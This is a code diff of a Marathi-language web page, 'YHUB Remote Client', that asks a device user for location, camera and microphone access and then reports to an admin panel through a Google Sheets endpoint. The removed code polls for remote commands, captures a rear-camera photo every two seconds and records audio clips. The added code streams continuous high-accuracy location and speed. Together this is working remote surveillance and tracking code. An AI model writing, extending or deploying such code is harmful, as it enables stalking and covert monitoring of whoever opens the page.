@@ -3,146 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>YHUB Remote • Client</title>
+    <title>YHUB Remote Client</title>
+    <link rel="manifest" href="manifest.json">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', system-ui, sans-serif;
-        }
-        body {
-            background: #0a0c10;
-            color: #e0e0e0;
-            padding: 20px;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-        .container {
-            max-width: 500px;
-            width: 100%;
-        }
-        h1 {
-            font-size: 1.8rem;
-            font-weight: 600;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 1rem;
-            text-align: center;
-        }
-        .card {
-            background: #161b22;
-            border-radius: 24px;
-            padding: 1.5rem;
-            margin: 1rem 0;
-            border: 1px solid #30363d;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-        }
-        .device-code {
-            background: #0d1117;
-            padding: 1rem;
-            border-radius: 40px;
-            text-align: center;
-            font-size: 0.9rem;
-            color: #8b949e;
-            border: 1px solid #30363d;
-            margin-bottom: 1.5rem;
-            word-break: break-all;
-        }
-        .permission-buttons {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-            margin: 1.5rem 0;
-        }
-        .btn {
-            padding: 14px;
-            border: none;
-            border-radius: 40px;
-            font-weight: 600;
-            font-size: 1rem;
-            cursor: pointer;
-            transition: 0.2s;
-            background: #21262d;
-            color: #fff;
-            border: 1px solid #30363d;
-        }
-        .btn-primary {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            border: none;
-        }
-        .btn-success {
-            background: linear-gradient(135deg, #34d399 0%, #10b981 100%);
-            border: none;
-        }
-        .btn-danger {
-            background: linear-gradient(135deg, #f87171 0%, #ef4444 100%);
-            border: none;
-        }
-        .status {
-            background: #0d1117;
-            padding: 1rem;
-            border-radius: 40px;
-            text-align: center;
-            font-size: 0.9rem;
-            color: #8b949e;
-            border: 1px solid #30363d;
-            margin: 1rem 0;
-        }
-        .loading {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid #30363d;
-            border-top-color: #667eea;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        .footer {
-            margin-top: 2rem;
-            color: #8b949e;
-            font-size: 0.8rem;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background: #0a0c10; color: #e0e0e0; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .container { max-width: 400px; width: 100%; }
+        .card { background: #161b22; border-radius: 30px; padding: 2rem; border: 1px solid #30363d; box-shadow: 0 20px 40px rgba(0,0,0,0.5); }
+        h1 { font-size: 2rem; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 1rem; text-align: center; }
+        .code-box { background: #0d1117; padding: 1rem; border-radius: 30px; text-align: center; font-size: 0.9rem; color: #8b949e; border: 1px solid #30363d; margin: 1.5rem 0; word-break: break-all; }
+        .status { background: #0d1117; padding: 1rem; border-radius: 30px; text-align: center; color: #8b949e; border: 1px solid #30363d; margin: 1rem 0; }
+        .btn { width: 100%; padding: 1rem; border: none; border-radius: 40px; font-weight: 600; font-size: 1.1rem; cursor: pointer; transition: 0.2s; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; margin: 0.5rem 0; }
+        .btn:hover { transform: scale(1.02); opacity: 0.9; }
+        .permission-list { margin: 1.5rem 0; }
+        .permission-item { background: #0d1117; padding: 1rem; border-radius: 16px; margin: 0.5rem 0; display: flex; justify-content: space-between; align-items: center; }
+        .badge { padding: 4px 12px; border-radius: 20px; font-size: 0.8rem; background: #238636; color: white; }
+        .badge.pending { background: #9e6a03; }
+        .footer { text-align: center; margin-top: 2rem; color: #8b949e; font-size: 0.8rem; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>📱 YHUB REMOTE CLIENT</h1>
-        
-        <div class="card" id="client-card">
-            <div class="device-code" id="device-code">कोड मिळत आहे...</div>
+        <div class="card">
+            <h1>📱 YHUB CLIENT</h1>
             
-            <div class="status" id="status">⚪ कनेक्ट होत आहे...</div>
-            
-            <div class="permission-buttons" id="permission-buttons">
-                <button class="btn btn-primary" onclick="requestAllPermissions()">🔐 सर्व परवानग्या द्या</button>
+            <div class="code-box" id="device-code">
+                कोड मिळत आहे...
             </div>
             
-            <div style="display: flex; gap: 10px; margin-top: 1rem;">
-                <button class="btn btn-success" style="flex:1;" onclick="startCamera()">📸 कॅमेरा सुरू</button>
-                <button class="btn btn-danger" style="flex:1;" onclick="stopCamera()">⏹️ कॅमेरा बंद</button>
+            <div class="status" id="status">
+                ⚪ कनेक्ट होत आहे...
             </div>
             
-            <div style="display: flex; gap: 10px; margin-top: 1rem;">
-                <button class="btn btn-success" style="flex:1;" onclick="startAudio()">🎤 ऑडिओ सुरू</button>
-                <button class="btn btn-danger" style="flex:1;" onclick="stopAudio()">⏹️ ऑडिओ बंद</button>
+            <div class="permission-list">
+                <div class="permission-item">
+                    <span>📍 लोकेशन</span>
+                    <span class="badge pending" id="loc-perm">परवानगी नाही</span>
+                </div>
+                <div class="permission-item">
+                    <span>📸 कॅमेरा</span>
+                    <span class="badge pending" id="cam-perm">परवानगी नाही</span>
+                </div>
+                <div class="permission-item">
+                    <span>🎤 मायक्रोफोन</span>
+                    <span class="badge pending" id="mic-perm">परवानगी नाही</span>
+                </div>
             </div>
             
-            <div style="margin-top: 1rem;">
-                <button class="btn btn-primary" style="width:100%;" onclick="sendLocation()">📍 लोकेशन पाठवा</button>
-            </div>
+            <button class="btn" onclick="requestAllPermissions()">
+                🔐 सर्व परवानग्या द्या
+            </button>
             
-            <div id="debug" style="margin-top: 1rem; font-size: 0.8rem; color: #8b949e; text-align: center;"></div>
+            <div style="margin-top: 1rem; font-size: 0.8rem; color: #8b949e; text-align: center;">
+                <p>✅ एकदा परवानग्या दिल्यानंतर, हे पेज बंद करू नका.</p>
+                <p>📡 ॲडमिन पॅनलवरून कंट्रोल केले जाईल.</p>
+            </div>
         </div>
         
         <div class="footer">
-            Y HUB REMOTE v3.0 • GitHub Edition
+            Y HUB REMOTE v4.0 • GitHub Edition
         </div>
     </div>
 
@@ -152,210 +71,112 @@
         
         // URL मधून device code मिळवा
         const urlParams = new URLSearchParams(window.location.search);
-        const deviceCode = urlParams.get('code') || localStorage.getItem('yhub_device_code') || 'dev_' + Math.random().toString(36).substring(2, 10);
+        let deviceCode = urlParams.get('code');
+        
+        if (!deviceCode) {
+            deviceCode = 'dev_' + Math.random().toString(36).substring(2, 10);
+            // URL update करा
+            const newUrl = window.location.origin + window.location.pathname + '?code=' + deviceCode;
+            window.history.replaceState({}, '', newUrl);
+        }
         
         // लोकल स्टोरेजमध्ये सेव्ह करा
         localStorage.setItem('yhub_device_code', deviceCode);
         
-        // ग्लोबल व्हेरिएबल्स
-        let cameraInterval = null;
-        let mediaRecorder = null;
-        let audioChunks = [];
-        let lastCommand = null;
-        
         // डिव्हाइस कोड दाखवा
         document.getElementById('device-code').innerHTML = `📱 डिव्हाइस कोड: <strong>${deviceCode}</strong>`;
         
+        // परवानगी स्थिती
+        let permissions = {
+            location: false,
+            camera: false,
+            microphone: false
+        };
+        
+        // लोकेशन वॉचर
+        let watchId = null;
+        
         // ---------- सर्व परवानग्या मागा ----------
         async function requestAllPermissions() {
-            document.getElementById('status').innerHTML = '📡 परवानग्या मागितल्या जात आहेत...';
+            updateStatus('📡 परवानग्या मागितल्या जात आहेत...');
             
             try {
                 // लोकेशन परवानगी
-                await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
+                const loc = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    });
                 });
+                permissions.location = true;
+                document.getElementById('loc-perm').innerHTML = '✅ दिली';
+                document.getElementById('loc-perm').className = 'badge';
                 
                 // कॅमेरा आणि मायक्रोफोन परवानगी
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: true, 
+                    audio: true 
+                });
                 stream.getTracks().forEach(track => track.stop());
                 
-                document.getElementById('status').innerHTML = '✅ सर्व परवानग्या मिळाल्या!';
-                document.getElementById('permission-buttons').style.display = 'none';
+                permissions.camera = true;
+                permissions.microphone = true;
+                document.getElementById('cam-perm').innerHTML = '✅ दिली';
+                document.getElementById('cam-perm').className = 'badge';
+                document.getElementById('mic-perm').innerHTML = '✅ दिली';
+                document.getElementById('mic-perm').className = 'badge';
+                
+                updateStatus('✅ सर्व परवानग्या मिळाल्या!');
+                
+                // रेजिस्ट्रेशन Google Sheets वर पाठवा
+                await sendToSheet({
+                    device_code: deviceCode,
+                    cmd_type: 'register',
+                    status: 'active'
+                });
+                
+                // लोकेशन ट्रॅकिंग सुरू करा (Service Worker द्वारे)
+                startLocationTracking();
                 
             } catch (err) {
-                document.getElementById('status').innerHTML = `❌ परवानगी त्रुटी: ${err.message}`;
+                updateStatus('❌ त्रुटी: ' + err.message);
+                console.error(err);
             }
         }
         
-        // ---------- कमांड चेक करण्यासाठी पोलिंग ----------
-        async function checkCommands() {
-            try {
-                const response = await fetch(GSHEET_URL);
-                const data = await response.json();
-                
-                // या डिव्हाइसच्या pending कमांड शोधा
-                const pendingCommands = data.filter(row => 
-                    row.device_code === deviceCode && 
-                    row.status === 'pending' &&
-                    ['location', 'photo', 'audio', 'stop'].includes(row.cmd_type)
-                );
-                
-                if (pendingCommands.length > 0) {
-                    const cmd = pendingCommands[pendingCommands.length - 1];
-                    lastCommand = cmd.cmd_type;
-                    
-                    document.getElementById('status').innerHTML = `📩 कमांड मिळाली: ${cmd.cmd_type}`;
-                    
-                    if (cmd.cmd_type === 'location') {
-                        sendLocation();
-                    } else if (cmd.cmd_type === 'photo') {
-                        startCamera();
-                    } else if (cmd.cmd_type === 'audio') {
-                        startAudio();
-                    } else if (cmd.cmd_type === 'stop') {
-                        stopCamera();
-                        stopAudio();
-                    }
-                }
-            } catch (err) {
-                console.error('कमांड चेक त्रुटी:', err);
-            }
-        }
-        
-        // ---------- लोकेशन पाठवा ----------
-        function sendLocation() {
-            if (!navigator.geolocation) {
-                alert('लोकेशन सपोर्ट नाही');
-                return;
-            }
+        // ---------- लोकेशन ट्रॅकिंग सुरू करा ----------
+        function startLocationTracking() {
+            if (watchId) return;
             
-            document.getElementById('status').innerHTML = '📍 लोकेशन मिळवत आहे...';
-            
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const data = {
+            watchId = navigator.geolocation.watchPosition(
+                async (position) => {
+                    // लोकेशन अपडेट Google Sheets ला पाठवा
+                    await sendToSheet({
                         device_code: deviceCode,
                         cmd_type: 'location',
                         lat: position.coords.latitude,
                         lng: position.coords.longitude,
                         accuracy: position.coords.accuracy,
-                        status: 'executed'
-                    };
-                    
-                    sendToSheet(data);
-                    document.getElementById('status').innerHTML = '✅ लोकेशन पाठवली!';
+                        speed: position.coords.speed || 0,
+                        timestamp: new Date().toISOString()
+                    });
                 },
                 (error) => {
-                    document.getElementById('status').innerHTML = `❌ लोकेशन त्रुटी: ${error.message}`;
+                    console.error('लोकेशन त्रुटी:', error);
+                },
+                {
+                    enableHighAccuracy: true,
+                    maximumAge: 0,
+                    timeout: 5000
                 }
             );
-        }
-        
-        // ---------- कॅमेरा सुरू करा ----------
-        function startCamera() {
-            if (cameraInterval) return;
-            
-            document.getElementById('status').innerHTML = '📸 कॅमेरा सुरू...';
-            
-            cameraInterval = setInterval(async () => {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: 'environment' } 
-                    });
-                    
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.play();
-                    
-                    setTimeout(() => {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth || 640;
-                        canvas.height = video.videoHeight || 480;
-                        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                        
-                        const base64 = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
-                        
-                        sendToSheet({
-                            device_code: deviceCode,
-                            cmd_type: 'photo',
-                            photo_base64: base64,
-                            status: 'executed'
-                        });
-                        
-                        stream.getTracks().forEach(track => track.stop());
-                        document.getElementById('status').innerHTML = '📸 फोटो पाठवला';
-                    }, 500);
-                    
-                } catch (err) {
-                    document.getElementById('status').innerHTML = `❌ कॅमेरा त्रुटी: ${err.message}`;
-                }
-            }, 2000); // दर 2 सेकंदांनी फोटो
-        }
-        
-        function stopCamera() {
-            if (cameraInterval) {
-                clearInterval(cameraInterval);
-                cameraInterval = null;
-                document.getElementById('status').innerHTML = '⏹️ कॅमेरा थांबवला';
-            }
-        }
-        
-        // ---------- ऑडिओ रेकॉर्डिंग ----------
-        async function startAudio() {
-            if (mediaRecorder) return;
-            
-            audioChunks = [];
-            
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                mediaRecorder = new MediaRecorder(stream);
-                
-                mediaRecorder.ondataavailable = (e) => {
-                    audioChunks.push(e.data);
-                };
-                
-                mediaRecorder.onstop = () => {
-                    const blob = new Blob(audioChunks, { type: 'audio/webm' });
-                    const reader = new FileReader();
-                    
-                    reader.onloadend = () => {
-                        const base64 = reader.result.split(',')[1];
-                        sendToSheet({
-                            device_code: deviceCode,
-                            cmd_type: 'audio',
-                            audio_base64: base64,
-                            status: 'executed'
-                        });
-                        document.getElementById('status').innerHTML = '🎤 ऑडिओ पाठवला';
-                    };
-                    
-                    reader.readAsDataURL(blob);
-                    stream.getTracks().forEach(track => track.stop());
-                };
-                
-                mediaRecorder.start();
-                document.getElementById('status').innerHTML = '🎤 ऑडिओ रेकॉर्ड होत आहे...';
-                
-                // 5 सेकंदांनी थांबवा
-                setTimeout(stopAudio, 5000);
-                
-            } catch (err) {
-                document.getElementById('status').innerHTML = `❌ ऑडिओ त्रुटी: ${err.message}`;
-            }
-        }
-        
-        function stopAudio() {
-            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-                mediaRecorder.stop();
-                mediaRecorder = null;
-            }
         }
         
         // ---------- Google Sheets ला डेटा पाठवा ----------
         async function sendToSheet(data) {
             try {
-                const response = await fetch(GSHEET_URL, {
+                await fetch(GSHEET_URL, {
                     method: 'POST',
                     mode: 'no-cors',
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
@@ -366,20 +187,26 @@
             }
         }
         
-        // ---------- Service Worker (ऑफलाइन सपोर्ट) ----------
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('sw.js').catch(err => console.log('SW error:', err));
+        // ---------- स्टेटस अपडेट करा ----------
+        function updateStatus(msg) {
+            document.getElementById('status').innerHTML = msg;
         }
         
-        // ---------- इनिशियलायझेशन ----------
-        requestAllPermissions();
-        setInterval(checkCommands, 3000); // दर 3 सेकंदांनी कमांड तपासा
+        // ---------- Service Worker रजिस्टर करा ----------
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('sw.js').then(reg => {
+                console.log('Service Worker registered');
+            }).catch(err => {
+                console.log('SW error:', err);
+            });
+        }
         
-        // पेज बंद करताना कॅमेरा/ऑडिओ थांबवा
+        // ---------- पेज बंद करताना क्लीनअप ----------
         window.addEventListener('beforeunload', () => {
-            stopCamera();
-            stopAudio();
+            if (watchId) {
+                navigator.geolocation.clearWatch(watchId);
+            }
         });
     </script>
 </body>
-</html>
+         </html>
